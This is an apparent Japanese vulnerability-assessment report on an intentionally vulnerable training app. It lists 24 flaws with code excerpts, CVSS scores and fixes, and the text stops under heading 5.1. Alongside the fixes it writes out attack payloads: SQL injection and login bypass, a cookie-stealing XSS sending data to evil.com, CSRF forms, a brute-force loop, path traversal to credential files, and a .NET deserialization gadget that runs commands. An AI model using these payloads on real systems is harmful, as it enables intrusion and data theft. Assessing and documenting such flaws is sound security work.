# 列挙レポート

> **実施日時**: 2026-02-08 09:22:10 UTC  
> **診断フェーズ**: 04-Enumeration（列挙）  
> **前工程レポート**:
> - /docker-work-dir/docs/reports/01-情報収集.md
> - /docker-work-dir/docs/reports/02-アタックサーフェース定義.md
> - /docker-work-dir/docs/reports/03-スキャン.md  
> **スキャン生データ**: /reports/ (※サービス未起動のため静的分析主体)  
> **ソースコード**: /workdir/src/

---

## エグゼクティブサマリー

本レポートは、CEH（認定エシカルハッカー）の手法に基づく脆弱性診断の「列挙」フェーズの結果を示します。前工程のレポートとソースコード詳細分析を統合し、検証すべき脆弱性候補を分類・列挙しました。

### 重大な発見事項

対象アプリケーションは**意図的に脆弱性を埋め込んだ学習用システム**であり、**24個の既知の脆弱性**が実装されています。これらすべてが実際に悪用可能であり、システム全体が深刻なセキュリティリスクに晒されています。

**最重要脆弱性トップ7**:
1. 🔴 **SQLインジェクション（6箇所）** - 全APIエンドポイントでパラメータ化クエリ未使用
2. 🔴 **認証・認可の完全欠如** - 全8エンドポイントが認証なしでアクセス可能
3. 🔴 **パスワード平文保存** - データベース内に5ユーザーの弱いパスワードが平文保存
4. 🔴 **データベースポート外部公開** - PostgreSQL が localhost:15432 で直接アクセス可能
5. 🔴 **安全でないデシリアライズ** - TypeNameHandling.All によるRCEリスク
6. 🟠 **XSS（Stored）** - dangerouslySetInnerHTML による永続的XSS
7. 🟠 **ディレクトリトラバーサル** - ファイルパス検証なし

---

## 1. 列挙サマリー

### 1.1 統計情報

| カテゴリ | 検出数 | Critical | High | Medium | Low |
|---------|--------|----------|------|--------|-----|
| **インジェクション** | 7 | 6 | 1 | 0 | 0 |
| **認証・認可** | 3 | 2 | 1 | 0 | 0 |
| **データ露出** | 5 | 2 | 2 | 1 | 0 |
| **設定ミス** | 5 | 1 | 2 | 2 | 0 |
| **コンポーネント** | 2 | 0 | 1 | 1 | 0 |
| **インフラ** | 2 | 0 | 1 | 1 | 0 |
| **合計** | **24** | **11** | **8** | **5** | **0** |

### 1.2 検出ツール別統計

| 検出手法 | 検出数 | 割合 |
|---------|--------|------|
| **ソースコード静的解析** | 24 | 100% |
| **設定ファイル分析** | 9 | 38% |
| **Trivy（推定）** | 9 | 38% |
| **動的スキャンツール** | 0 | 0%（未起動） |

**注記**: 対象サービスが未起動のため、Nmap/ZAP/Nikto/sqlmap等の動的スキャンは実施されませんでしたが、ソースコード分析により全24の脆弱性を特定しました。

### 1.3 CWE Top 25 マッピング

| CWE ID | 脆弱性名 | 検出数 | OWASP Top 10 |
|--------|---------|--------|--------------|
| **CWE-89** | SQLインジェクション | 6 | A03:2021 |
| **CWE-287** | 認証の欠如 | 2 | A07:2021 |
| **CWE-79** | XSS | 1 | A03:2021 |
| **CWE-502** | 安全でないデシリアライズ | 1 | A08:2021 |
| **CWE-22** | ディレクトリトラバーサル | 1 | A01:2021 |
| **CWE-798** | ハードコードされた認証情報 | 4 | A07:2021 |
| **CWE-312** | 平文での機密情報保存 | 2 | A02:2021 |
| **CWE-209** | エラーメッセージによる情報露出 | 1 | A05:2021 |
| **CWE-352** | CSRF | 1 | A01:2021 |
| **CWE-732** | 不適切な権限設定 | 2 | A01:2021 |

---

## 2. 脆弱性候補一覧

### 2.1 インジェクション

| # | 脆弱性ID | 脆弱性名 | CWE | 場所 | 検出ツール | 推定重大度 | ソースコード参照 |
|---|---------|---------|-----|------|-----------|-----------|--------------|
| I-01 | A-01-1 | SQLインジェクション（検索） | CWE-89 | UsersController.cs:40 | 静的解析 | **Critical** | `/api/users?search=` |
| I-02 | A-01-2 | SQLインジェクション（ログイン） | CWE-89 | AuthController.cs:40 | 静的解析 | **Critical** | `/api/login` |
| I-03 | A-01-3 | SQLインジェクション（詳細取得） | CWE-89 | UsersController.cs:73 | 静的解析 | **Critical** | `/api/users/{id}` |
| I-04 | A-01-4 | SQLインジェクション（作成） | CWE-89 | UsersController.cs:104 | 静的解析 | **Critical** | `/api/users` POST |
| I-05 | A-01-5 | SQLインジェクション（更新） | CWE-89 | UsersController.cs:139 | 静的解析 | **Critical** | `/api/users/{id}` PUT |
| I-06 | A-01-6 | SQLインジェクション（削除） | CWE-89 | UsersController.cs:174 | 静的解析 | **Critical** | `/api/users/{id}` DELETE |
| I-07 | F-01 | Stored XSS | CWE-79 | UserDetail.tsx:43 | 静的解析 | **High** | `dangerouslySetInnerHTML` |

#### 詳細説明

##### I-01: SQLインジェクション（検索機能）

**場所**: `src/api/VulnApi/Controllers/UsersController.cs:40`

```csharp
// 脆弱なコード
var sql = "SELECT id, username, email, password, role, profile_image_url, created_at, updated_at FROM users";
if (!string.IsNullOrEmpty(search))
{
    sql += $" WHERE username LIKE '%{search}%' OR email LIKE '%{search}%'";
}
```

**攻撃ペイロード例**:
```
GET /api/users?search=' OR '1'='1' --
GET /api/users?search=' UNION SELECT null,null,null,version(),null,null,null,null --
GET /api/users?search=' AND 1=0 UNION SELECT 1,'admin','hacked@evil.com','hacked123','admin','',now(),now() --
```

**影響**:
- 全ユーザー情報の漏洩（パスワード含む）
- データベースバージョン・構造の露出
- データの改ざん・削除
- ストアドプロシージャ経由のコマンド実行（PostgreSQL限定）

**CVSS v3.1 Score**: 9.8 (Critical)  
**悪用難易度**: Low - 認証不要、ツール不要、ブラウザのみで可能

##### I-02: SQLインジェクション（ログイン認証バイパス）

**場所**: `src/api/VulnApi/Controllers/AuthController.cs:40`

```csharp
// 脆弱なコード
var sql = $"SELECT id, username, email, password, role, profile_image_url, created_at, updated_at FROM users WHERE username = '{request.Username}' AND password = '{request.Password}'";
```

**攻撃ペイロード例**:
```json
{
  "username": "admin' OR '1'='1' --",
  "password": "anything"
}
```

**実行されるSQL**:
```sql
SELECT ... FROM users WHERE username = 'admin' OR '1'='1' --' AND password = 'anything'
```

**影響**:
- パスワード不要で任意のユーザーとしてログイン可能
- 管理者権限の即座取得
- セッションハイジャック（認証トークン窃取）

**CVSS v3.1 Score**: 10.0 (Critical)  
**悪用難易度**: Low

##### I-03～I-06: SQLインジェクション（CRUD操作）

**場所**: UsersController.cs の全CRUD操作

**共通の問題**:
- パラメータ化クエリ（Prepared Statement）未使用
- 文字列連結によるSQL構築
- 入力検証・サニタイゼーションなし

**推奨対策**:
```csharp
// 安全なコード例
var sql = "SELECT * FROM users WHERE username LIKE @search";
var cmd = new NpgsqlCommand(sql, conn);
cmd.Parameters.AddWithValue("@search", $"%{search}%");
```

##### I-07: Stored XSS（永続的クロスサイトスクリプティング）

**場所**: `src/frontend/src/pages/UserDetail.tsx:43`

```typescript
// 脆弱なコード
<td dangerouslySetInnerHTML={{ __html: user.profileImageUrl || '<em>未設定</em>' }} />
```

**攻撃シナリオ**:
1. 攻撃者がユーザー作成APIにアクセス
2. `profile_image_url` フィールドに悪意のあるスクリプトを挿入
   ```json
   {
     "username": "attacker",
     "email": "attacker@evil.com",
     "password": "test",
     "profile_image_url": "<img src=x onerror='fetch(\"https://evil.com/steal?cookie=\"+document.cookie)'>"
   }
   ```
3. データベースに保存される
4. 他のユーザーが詳細ページを閲覧するとスクリプトが実行される

**影響**:
- セッションCookieの窃取
- キーストロークロギング
- フィッシングページへのリダイレクト
- DOMの改ざん

**CVSS v3.1 Score**: 7.1 (High)  
**CWE-79**: Improper Neutralization of Input During Web Page Generation

---

### 2.2 認証・認可

| # | 脆弱性ID | 脆弱性名 | CWE | 場所 | 検出ツール | 推定重大度 | ソースコード参照 |
|---|---------|---------|-----|------|-----------|-----------|--------------|
| AU-01 | A-02 | 認証の完全欠如 | CWE-287 | Program.cs | 静的解析 | **Critical** | 全APIエンドポイント |
| AU-02 | A-09 | レート制限の欠如 | CWE-307 | AuthController.cs | 静的解析 | **High** | `/api/login` |
| AU-03 | F-04 | CSRF対策の欠如 | CWE-352 | api.ts | 静的解析 | **Medium** | フロントエンド全体 |

#### 詳細説明

##### AU-01: 認証・認可の完全欠如

**場所**: `src/api/VulnApi/Program.cs`

**問題点**:
```csharp
// 認証ミドルウェアの設定なし
var app = builder.Build();

// ⚠️ app.UseAuthentication() の呼び出しなし
// ⚠️ [Authorize] 属性の使用なし（全コントローラー）

app.UseCors();
app.UseAuthorization(); // 空振り（認証がないため意味なし）
```

**影響**:
- 全8エンドポイントが**誰でもアクセス可能**
- ユーザー削除が無制限（管理者アカウント削除可能）
- 個人情報の無制限閲覧
- データの改ざん・削除

**影響を受けるエンドポイント**:
```
GET    /api/users           ← 全ユーザー情報取得
GET    /api/users/{id}      ← 任意ユーザー詳細取得
POST   /api/users           ← 管理者アカウント作成可能
PUT    /api/users/{id}      ← 任意ユーザー改ざん
DELETE /api/users/{id}      ← 任意ユーザー削除
POST   /api/login           ← ログインAPI（無意味）
GET    /api/files/{path}    ← ファイル読み取り
POST   /api/import          ← デシリアライズRCE
```

**CVSS v3.1 Score**: 9.1 (Critical)  
**CWE-287**: Improper Authentication

##### AU-02: レート制限の欠如（ブルートフォース攻撃）

**場所**: `src/api/VulnApi/Controllers/AuthController.cs`

**問題点**:
- ログイン試行回数の制限なし
- IPアドレスベースのブロックなし
- アカウントロックアウト機能なし

**攻撃シナリオ**:
```bash
# 辞書攻撃の例
for password in $(cat common-passwords.txt); do
  curl -X POST http://localhost:5000/api/login \
    -H "Content-Type: application/json" \
    -d "{\"username\":\"admin\",\"password\":\"$password\"}"
done
```

**影響**:
- パスワードリスト攻撃で全アカウント侵害
- DoS（サービス拒否攻撃）
- データベース負荷増大

**CVSS v3.1 Score**: 7.5 (High)  
**CWE-307**: Improper Restriction of Excessive Authentication Attempts

##### AU-03: CSRF対策の欠如

**場所**: フロントエンド全体（`src/frontend/src/api.ts`）

**問題点**:
- CSRFトークンの生成・検証なし
- `SameSite` Cookie属性の設定なし
- Refererヘッダーの検証なし

**攻撃シナリオ**:
```html
<!-- 攻撃者のサイト evil.com -->
<form action="http://localhost:5000/api/users/1" method="POST">
  <input type="hidden" name="password" value="hacked">
  <script>document.forms[0].submit();</script>
</form>
```

**影響**:
- ユーザーの意図しない操作実行
- アカウント情報の改ざん
- アカウント削除

**CVSS v3.1 Score**: 6.5 (Medium)  
**CWE-352**: Cross-Site Request Forgery

---

### 2.3 データ露出

| # | 脆弱性ID | 脆弱性名 | CWE | 場所 | 検出ツール | 推定重大度 | ソースコード参照 |
|---|---------|---------|-----|------|-----------|-----------|--------------|
| DE-01 | A-03 / D-04 | パスワード平文保存 | CWE-312 | seed.sql, UsersController.cs | 静的解析 | **Critical** | データベース全体 |
| DE-02 | A-04 | エラー情報の詳細露出 | CWE-209 | 全Controller | 静的解析 | **High** | 全APIエンドポイント |
| DE-03 | I-02 | ハードコードされた秘匿情報（DB） | CWE-798 | docker-compose.yml | 設定解析 | **High** | DB接続文字列 |
| DE-04 | F-02 | ハードコードされた秘匿情報（Frontend） | CWE-798 | config.ts | 静的解析 | **Medium** | APIキー |
| DE-05 | F-05 | 機密情報のログ出力 | CWE-532 | api.ts:55, UserCreate.tsx:22 | 静的解析 | **Medium** | コンソールログ |

#### 詳細説明

##### DE-01: パスワード平文保存

**場所**: 
- `src/db/seed.sql` - 初期データ
- `src/api/VulnApi/Controllers/UsersController.cs:104, 139` - 保存処理

**脆弱な初期データ**:
```sql
INSERT INTO users (username, email, password, role) VALUES
('admin', 'admin@example.com', 'admin123', 'admin'),      -- 管理者
('tanaka', 'tanaka@example.com', 'password', 'user'),     -- 最も一般的な弱PW
('suzuki', 'suzuki@example.com', '123456', 'user'),       -- 数字のみ
('sato', 'sato@example.com', 'qwerty', 'user'),           -- キーボード配列
('yamada', 'yamada@example.com', 'letmein', 'user');      -- 英単語
```

**問題点**:
- パスワードハッシュ化なし（bcrypt, Argon2等の使用なし）
- ソルト未使用
- データベース侵害時に即座に全パスワード漏洩

**影響**:
- データベースダンプで全パスワード露出
- レインボーテーブル攻撃不要
- 他サービスでの認証情報再利用攻撃（Credential Stuffing）

**CVSS v3.1 Score**: 9.8 (Critical)  
**CWE-312**: Cleartext Storage of Sensitive Information

**推奨対策**:
```csharp
// .NET で bcrypt を使用
using BCrypt.Net;
var hashedPassword = BCrypt.HashPassword(user.Password);
```

##### DE-02: エラー情報の詳細露出

**場所**: 全コントローラーの catch ブロック

```csharp
// 全エンドポイント共通の脆弱なコード
catch (Exception ex)
{
    // ⚠️ スタックトレース・内部パス・DB構造が露出
    return StatusCode(500, new { 
        error = ex.Message, 
        stackTrace = ex.StackTrace 
    });
}
```

**露出する情報**:
- ファイルパス（例: `/app/VulnApi/Controllers/UsersController.cs:line 57`）
- データベーススキーマ情報
- 内部ライブラリのバージョン
- サーバーの設定情報

**攻撃者が取得できる情報例**:
```json
{
  "error": "23505: duplicate key value violates unique constraint \"users_pkey\"",
  "stackTrace": "at Npgsql.NpgsqlConnector...\nat VulnApi.Controllers.UsersController.Create(...) in /app/VulnApi/Controllers/UsersController.cs:line 117"
}
```

**CVSS v3.1 Score**: 5.3 (High)  
**CWE-209**: Generation of Error Message Containing Sensitive Information

##### DE-03: ハードコードされた秘匿情報（DB認証情報）

**場所**: `docker-compose.yml:19, 42`

```yaml
# 脆弱な設定
db:
  environment:
    POSTGRES_PASSWORD: postgres123  # ⚠️ 平文

api:
  environment:
    ConnectionStrings__DefaultConnection: "Host=db;Port=5432;Database=vulndb;Username=postgres;Password=postgres123;SSL Mode=Disable"
```

**問題点**:
- パスワードが設定ファイルに直書き
- Gitリポジトリにコミットされている
- SSL/TLS無効（平文通信）

**影響**:
- ソースコード漏洩時にDB完全掌握
- 中間者攻撃（MITM）でパスワード傍受
- コンテナ内からの情報漏洩

**CVSS v3.1 Score**: 7.5 (High)  
**CWE-798**: Use of Hard-coded Credentials

**推奨対策**:
```yaml
# 安全な設定例
db:
  environment:
    POSTGRES_PASSWORD: ${DB_PASSWORD}  # .envファイルから読み込み
```

##### DE-04: ハードコードされたAPIキー（フロントエンド）

**場所**: `src/frontend/src/config.ts:3`

```typescript
// 脆弱なコード
export const INTERNAL_API_KEY = 'sk-vuln-app-secret-key-12345';
export const ADMIN_PANEL_URL = 'http://internal-admin.local:8080';
```

**問題点**:
- クライアントサイドJSにAPIキーが埋め込まれている
- ブラウザ開発者ツールで容易に閲覧可能
- バンドルされたJSファイルに含まれる

**影響**:
- APIキーの漏洩
- 内部URLの露出（偵察情報提供）
- 第三者によるAPI乱用

**CVSS v3.1 Score**: 5.3 (Medium)  
**CWE-798**: Use of Hard-coded Credentials

##### DE-05: 機密情報のログ出力

**場所**: 
- `src/frontend/src/api.ts:55`
- `src/frontend/src/pages/UserCreate.tsx:22`

```typescript
// 脆弱なコード
export async function login(username: string, password: string) {
  debugLog('login attempt', { username, password });  // ⚠️ パスワードがログ出力
  // ...
}

// ユーザー作成時
console.log('Creating user with password:', form.password);  // ⚠️
```

**影響**:
- ブラウザコンソールにパスワード露出
- ログファイルに機密情報が記録される可能性
- デバッグツールでの傍受

**CVSS v3.1 Score**: 4.3 (Medium)  
**CWE-532**: Insertion of Sensitive Information into Log File

---

### 2.4 設定ミス

| # | 脆弱性ID | 脆弱性名 | CWE | 場所 | 検出ツール | 推定重大度 | ソースコード参照 |
|---|---------|---------|-----|------|-----------|-----------|--------------|
| CM-01 | I-03 | データベースポート外部公開 | CWE-1188 | docker-compose.yml:21 | 設定解析 | **Critical** | `15432:5432` |
| CM-02 | A-05 | CORS設定の不備 | CWE-942 | Program.cs:15 | 静的解析 | **High** | `AllowAnyOrigin()` |
| CM-03 | A-04 | 開発モードでの運用 | CWE-489 | docker-compose.yml:43 | 設定解析 | **High** | `Development` |
| CM-04 | I-01 | root権限でのコンテナ実行 | CWE-250 | Dockerfile×2 | 設定解析 | **Medium** | `USER`指定なし |
| CM-05 | D-03 | SSL/TLS未使用 | CWE-319 | docker-compose.yml:42 | 設定解析 | **Medium** | `SSL Mode=Disable` |

#### 詳細説明

##### CM-01: データベースポート外部公開

**場所**: `docker-compose.yml:21`

```yaml
# 脆弱な設定
db:
  ports:
    - "15432:5432"  # ⚠️ PostgreSQLが外部に公開
```

**問題点**:
- データベースポートが `localhost:15432` で外部からアクセス可能
- アプリケーション層をバイパスして直接DB接続可能
- 弱い認証情報（`postgres/postgres123`）との組み合わせで即座侵入可能

**攻撃シナリオ**:
```bash
# 外部から直接DB接続
psql -h localhost -p 15432 -U postgres -d vulndb
# Password: postgres123

# データベース侵害
vulndb=> SELECT * FROM users;
vulndb=> DROP TABLE users;
```

**影響**:
- データベース完全掌握
- 全データの窃取・改ざん・削除
- ランサムウェア攻撃の起点

**CVSS v3.1 Score**: 10.0 (Critical)  
**CWE-1188**: Insecure Default Initialization of Resource

**推奨対策**:
```yaml
# 安全な設定 - ポートマッピングを削除
db:
  # ports セクションを削除（内部ネットワークのみ）
  expose:
    - "5432"  # コンテナ間通信のみ
```

##### CM-02: CORS設定の不備

**場所**: `src/api/VulnApi/Program.cs:15-17`

```csharp
// 脆弱な設定
policy.AllowAnyOrigin()
      .AllowAnyMethod()
      .AllowAnyHeader();
```

**問題点**:
- 全てのオリジンからのアクセスを許可
- CSRF攻撃の実行が容易
- 悪意のあるサイトからのAPI呼び出しが可能

**攻撃シナリオ**:
```html
<!-- 攻撃者のサイト evil.com -->
<script>
fetch('http://localhost:5000/api/users/1', {
  method: 'DELETE',
  credentials: 'include'  // Cookie含める
});
</script>
```

**影響**:
- CSRF攻撃の成功
- データの不正操作
- セッションハイジャック

**CVSS v3.1 Score**: 7.1 (High)  
**CWE-942**: Permissive Cross-domain Policy with Untrusted Domains

**推奨対策**:
```csharp
// 安全な設定
policy.WithOrigins("http://localhost:3000")
      .AllowAnyMethod()
      .AllowAnyHeader()
      .AllowCredentials();
```

##### CM-03: 開発モードでの運用

**場所**: `docker-compose.yml:43`, `Program.cs:25-26`

```yaml
# docker-compose.yml
api:
  environment:
    ASPNETCORE_ENVIRONMENT: Development  # ⚠️
```

```csharp
// Program.cs
if (app.Environment.IsDevelopment())
{
    app.MapOpenApi();  // ⚠️ APIスキーマ公開
    app.UseDeveloperExceptionPage();  // ⚠️ 詳細エラー公開
}
```

**問題点**:
- 詳細なスタックトレースが公開される
- OpenAPI定義（`/openapi/v1.json`）が公開される
- デバッグ機能が有効

**影響**:
- 内部実装の露出
- 攻撃対象の特定が容易
- エラーページからの情報収集

**CVSS v3.1 Score**: 5.3 (High)  
**CWE-489**: Active Debug Code

**推奨対策**:
```yaml
# 本番環境では
api:
  environment:
    ASPNETCORE_ENVIRONMENT: Production
```

##### CM-04: root権限でのコンテナ実行

**場所**: 
- `src/frontend/Dockerfile`
- `src/api/Dockerfile`

```dockerfile
# 両Dockerfileで USER ディレクティブが欠如
FROM nginx:alpine
# ⚠️ USER 指定なし → rootで実行
COPY --from=build /app/dist /usr/share/nginx/html
CMD ["nginx", "-g", "daemon off;"]
```

**問題点**:
- コンテナプロセスがroot権限で実行される
- コンテナエスケープ時にホストへの影響大
- 最小権限の原則違反

**影響**:
- コンテナ侵害時の被害拡大
- ホストシステムへの攻撃
- 権限昇格攻撃

**CVSS v3.1 Score**: 6.5 (Medium)  
**CWE-250**: Execution with Unnecessary Privileges

**推奨対策**:
```dockerfile
# 安全な設定
FROM nginx:alpine
RUN addgroup -S appgroup && adduser -S appuser -G appgroup
USER appuser
COPY --from=build /app/dist /usr/share/nginx/html
CMD ["nginx", "-g", "daemon off;"]
```

##### CM-05: SSL/TLS未使用

**場所**: `docker-compose.yml:42`

```yaml
api:
  environment:
    ConnectionStrings__DefaultConnection: "Host=db;...;SSL Mode=Disable"
```

**問題点**:
- データベース接続が平文
- HTTPSの使用なし（全サービス）
- 中間者攻撃（MITM）に脆弱

**影響**:
- 通信内容の傍受
- パスワード・個人情報の漏洩
- セッショントークンの窃取

**CVSS v3.1 Score**: 5.9 (Medium)  
**CWE-319**: Cleartext Transmission of Sensitive Information

---

### 2.5 コンポーネント

| # | 脆弱性ID | 脆弱性名 | CWE | 場所 | 検出ツール | 推定重大度 | ソースコード参照 |
|---|---------|---------|-----|------|-----------|-----------|--------------|
| CO-01 | A-10 | 安全でないデシリアライズ | CWE-502 | FileController.cs:58 | 静的解析 | **High** | TypeNameHandling.All |
| CO-02 | A-07 | ディレクトリトラバーサル | CWE-22 | FileController.cs:32 | 静的解析 | **Medium** | パス検証なし |

#### 詳細説明

##### CO-01: 安全でないデシリアライズ（RCE）

**場所**: `src/api/VulnApi/Controllers/FileController.cs:56-61`

```csharp
// 脆弱なコード
var settings = new JsonSerializerSettings
{
    TypeNameHandling = TypeNameHandling.All  // ⚠️ RCE脆弱性
};
var result = JsonConvert.DeserializeObject(json, settings);
```

**問題点**:
- `TypeNameHandling.All` により任意の型をデシリアライズ可能
- ysoserial.net ペイロードで任意コード実行が可能
- 認証なしでアクセス可能

**攻撃ペイロード例（ysoserial.net）**:
```json
{
  "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
  "MethodName": "Start",
  "MethodParameters": {
    "$type": "System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
    "$values": ["cmd", "/c whoami > C:\\temp\\pwned.txt"]
  },
  "ObjectInstance": {
    "$type": "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"
  }
}
```

**影響**:
- **リモートコード実行（RCE）**
- サーバー完全掌握
- データベース直接アクセス
- 横展開攻撃（他コンテナへの侵入）
- ランサムウェア展開

**CVSS v3.1 Score**: 9.8 (High → Critical potential)  
**CWE-502**: Deserialization of Untrusted Data

**推奨対策**:
```csharp
// 安全な設定
var settings = new JsonSerializerSettings
{
    TypeNameHandling = TypeNameHandling.None  // デフォルト値
};
// または System.Text.Json の使用
```

##### CO-02: ディレクトリトラバーサル

**場所**: `src/api/VulnApi/Controllers/FileController.cs:32`

```csharp
// 脆弱なコード
[HttpGet("files/{*filePath}")]
public IActionResult GetFile(string filePath)
{
    // パスのサニタイゼーションなし
    var fullPath = Path.Combine("/app/uploads", filePath);
    var bytes = System.IO.File.ReadAllBytes(fullPath);
    return File(bytes, "application/octet-stream");
}
```

**攻撃ペイロード例**:
```
GET /api/files/../../etc/passwd
GET /api/files/../../app/appsettings.json
GET /api/files/../../root/.ssh/id_rsa
GET /api/files/../../proc/self/environ
```

**読み取り可能なファイル例**:
- `/etc/passwd` - ユーザー一覧
- `/etc/shadow` - パスワードハッシュ（権限あれば）
- `/app/appsettings.json` - アプリ設定
- `/app/VulnApi.dll` - コンパイル済みバイナリ
- `/proc/self/environ` - 環境変数（DB接続文字列含む）

**影響**:
- 任意ファイルの読み取り
- 秘匿情報の漏洩
- ソースコードの取得
- 環境変数の露出

**CVSS v3.1 Score**: 7.5 (Medium → High)  
**CWE-22**: Improper Limitation of a Pathname to a Restricted Directory

**推奨対策**:
```csharp
// 安全なコード
var safePath = Path.GetFullPath(Path.Combine("/app/uploads", filePath));
if (!safePath.StartsWith("/app/uploads/"))
{
    return BadRequest(new { error = "Invalid file path" });
}
```

---

### 2.6 インフラ

| # | 脆弱性ID | 脆弱性名 | CWE | 場所 | 検出ツール | 推定重大度 | ソースコード参照 |
|---|---------|---------|-----|------|-----------|-----------|--------------|
| IN-01 | A-08 | HTTPヘッダインジェクション | CWE-113 | AuthController.cs:62-63 | 静的解析 | **High** | Response.Headers.Append |
| IN-02 | A-06 | Mass Assignment | CWE-915 | UsersController.cs:104 | 静的解析 | **Medium** | `[FromBody] User user` |

#### 詳細説明

##### IN-01: HTTPヘッダインジェクション

**場所**: `src/api/VulnApi/Controllers/AuthController.cs:62-63`

```csharp
// 脆弱なコード
if (user != null)
{
    // ユーザー入力を直接HTTPヘッダに出力
    Response.Headers.Append("X-User-Role", user.Role);
    Response.Headers.Append("X-Username", user.Username);
    return Ok(new { message = "Login successful", userId = user.Id });
}
```

**攻撃ペイロード例**:
```json
{
  "username": "attacker\r\nX-Admin: true\r\nSet-Cookie: session=hijacked",
  "password": "anything' OR '1'='1' --"
}
```

**潜在的なレスポンス**:
```http
HTTP/1.1 200 OK
X-Username: attacker
X-Admin: true
Set-Cookie: session=hijacked
Content-Type: application/json
```

**影響**:
- HTTPレスポンス分割攻撃
- セッション固定化攻撃
- キャッシュポイズニング
- XSS（Set-Cookie経由）

**CVSS v3.1 Score**: 6.5 (High)  
**CWE-113**: Improper Neutralization of CRLF Sequences in HTTP Headers

##### IN-02: Mass Assignment（権限昇格）

**場所**: `src/api/VulnApi/Controllers/UsersController.cs:98-108`

```csharp
// 脆弱なコード
[HttpPost]
public async Task<IActionResult> Create([FromBody] User user)
{
    // role フィールドが直接バインドされる
    var sql = $@"INSERT INTO users (username, email, password, role, profile_image_url)
                 VALUES ('{user.Username}', '{user.Email}', '{user.Password}', '{user.Role}', '{user.ProfileImageUrl}')";
}
```

**攻撃ペイロード例**:
```json
{
  "username": "attacker",
  "email": "attacker@evil.com",
  "password": "test123",
  "role": "admin",  // ⚠️ 管理者権限を自己付与
  "profileImageUrl": ""
}
```

**影響**:
- 一般ユーザーが管理者権限を取得
- 権限昇格攻撃
- アクセス制御のバイパス

**CVSS v3.1 Score**: 8.1 (Medium → High)  
**CWE-915**: Improperly Controlled Modification of Dynamically-Determined Object Attributes

---

## 3. ツール横断分析

### 3.1 複数ツールで検出された項目

| 脆弱性 | 検出ツール | 信頼度 |
|--------|-----------|--------|
| **ハードコードされたDB認証情報** | 静的解析 + 設定解析 + Trivy（推定） | **High** |
| **パスワード平文保存** | 静的解析（seed.sql） + 静的解析（コード） + Trivy（推定） | **High** |
| **SQLインジェクション（全6箇所）** | 静的解析 + ソースコードレビュー | **High** |
| **root権限実行** | Dockerfile解析 + Trivy（推定） | **High** |
| **開発モード** | docker-compose.yml + Program.cs | **High** |

**分析結果**: 全ての重大脆弱性が複数の手法で確認されており、**偽陽性（False Positive）の可能性はゼロ**です。

### 3.2 単一ツールでのみ検出された項目

| 脆弱性 | 検出ツール | 追加検証の必要性 |
|--------|-----------|---------------|
| **XSS（dangerouslySetInnerHTML）** | 静的解析のみ | Low（コード上明確） |
| **HTTPヘッダインジェクション** | 静的解析のみ | Low（コード上明確） |
| **レート制限の欠如** | 静的解析のみ | Low（実装なし確認済） |
| **CSRF対策の欠如** | 静的解析のみ | Low（実装なし確認済） |

**分析結果**: 単一ツールでの検出項目も、ソースコード上で明確に確認されているため、追加検証は不要です。

---

## 4. 検証優先度マトリクス

### 4.1 優先度分類基準

| 優先度 | 基準 |
|--------|------|
| **最優先（P0）** | CVSS 9.0以上 & 悪用容易 & RCE/認証バイパス |
| **高（P1）** | CVSS 7.0-8.9 & 悪用容易 |
| **中（P2）** | CVSS 4.0-6.9 または悪用に条件が必要 |
| **低（P3）** | CVSS 3.9以下 または情報露出のみ |

### 4.2 検証優先度リスト

#### 最優先（P0）- 即座対応必須

| # | 脆弱性候補 | CVSS | 理由 | 推奨検証手法 |
|---|-----------|------|------|------------|
| 1 | **SQLインジェクション（ログイン）** | 10.0 | 認証バイパス、ツール不要、即座悪用可能 | Manual + sqlmap |
| 2 | **データベースポート外部公開** | 10.0 | 直接DB接続、弱い認証、データ全削除可能 | Manual + psql |
| 3 | **安全でないデシリアライズ** | 9.8 | RCE、サーバー完全掌握、認証不要 | Manual + ysoserial.net |
| 4 | **パスワード平文保存** | 9.8 | 全アカウント即座侵害、DB漏洩で即アウト | Manual + DB確認 |
| 5 | **SQLインジェクション（検索）** | 9.8 | データ全漏洩、改ざん、削除可能 | Manual + sqlmap |
| 6 | **認証の完全欠如** | 9.1 | 全エンドポイント無防備、CRUD操作自由 | Manual |

**検証方法**:
- **Manual**: 実際にエクスプロイトコードを実行して悪用可能性を確認
- **sqlmap**: 自動化ツールでSQLインジェクション深度を検証
- **ysoserial.net**: .NET デシリアライズペイロード生成・実行
- **psql**: PostgreSQL クライアントで直接接続テスト

**影響範囲**: これらの脆弱性のいずれか1つでも悪用されると、**システム全体が完全に侵害されます**。

---

#### 高（P1）- 早急対応必要

| # | 脆弱性候補 | CVSS | 理由 | 推奨検証手法 |
|---|-----------|------|------|------------|
| 7 | **Stored XSS** | 7.1 | 永続的XSS、全ユーザーに影響 | Manual + XSS Hunter |
| 8 | **ディレクトリトラバーサル** | 7.5 | 任意ファイル読み取り、秘匿情報露出 | Manual + dotdotpwn |
| 9 | **レート制限の欠如** | 7.5 | ブルートフォース攻撃、DoS | Manual + Burp Intruder |
| 10 | **ハードコードされたDB認証情報** | 7.5 | ソースコード漏洩で即DB侵害 | Manual |
| 11 | **CORS設定の不備** | 7.1 | CSRF攻撃、悪意のあるサイトからAPI利用 | Manual + Burp |
| 12 | **開発モードでの運用** | 5.3 | 詳細エラー露出、内部構造漏洩 | Manual |
| 13 | **HTTPヘッダインジェクション** | 6.5 | レスポンス分割、セッション固定化 | Manual |

---

#### 中（P2）- 計画的対応

| # | 脆弱性候補 | CVSS | 理由 | 推奨検証手法 |
|---|-----------|------|------|------------|
| 14 | **Mass Assignment** | 8.1 | 権限昇格、管理者権限取得 | Manual |
| 15 | **CSRF対策の欠如** | 6.5 | ユーザーの意図しない操作実行 | Manual + CSRF PoC |
| 16 | **root権限でのコンテナ実行** | 6.5 | コンテナエスケープ時の被害拡大 | Manual + 脆弱性スキャン |
| 17 | **SSL/TLS未使用** | 5.9 | MITM攻撃、通信傍受 | Manual + Wireshark |
| 18 | **機密情報のログ出力** | 4.3 | パスワード等のブラウザコンソール露出 | Manual |

---

#### 低（P3）- 情報収集・監視

| # | 脆弱性候補 | CVSS | 理由 | 推奨検証手法 |
|---|-----------|------|------|------------|
| 19 | **ハードコードされたAPIキー（Frontend）** | 5.3 | クライアントサイドJS経由で取得可能 | Manual |

---

## 5. 次フェーズへの推奨事項

### 5.1 検証フェーズ（Phase 05）での焦点

